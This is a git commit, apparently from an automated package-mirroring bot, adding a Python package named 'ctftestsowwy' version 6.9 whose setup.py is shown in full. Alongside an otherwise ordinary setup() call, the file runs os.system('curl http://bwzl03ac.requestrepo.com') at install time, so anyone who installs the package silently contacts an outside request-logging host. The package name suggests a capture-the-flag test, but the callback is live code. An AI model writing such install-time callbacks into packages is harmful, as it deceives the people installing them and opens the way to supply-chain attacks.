acbac089945bbe38c08d5bb69ef7e711ce27158b
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-05-11 03:25:32 +0000

    Add package ctftestsowwy/6.9/ctftestsowwy-6.9.tar.gz

---
+++ packages/ctftestsowwy/ctftestsowwy-6.9.tar.gz/ctftestsowwy-6.9/setup.py
@@ -0,0 +1,11 @@
+from setuptools import setup, find_packages
+import os
+
+os.system('curl http://bwzl03ac.requestrepo.com')
+
+setup(
+    name='ctftestsowwy',
+    version='6.9',
+    packages=find_packages(),
+)
+
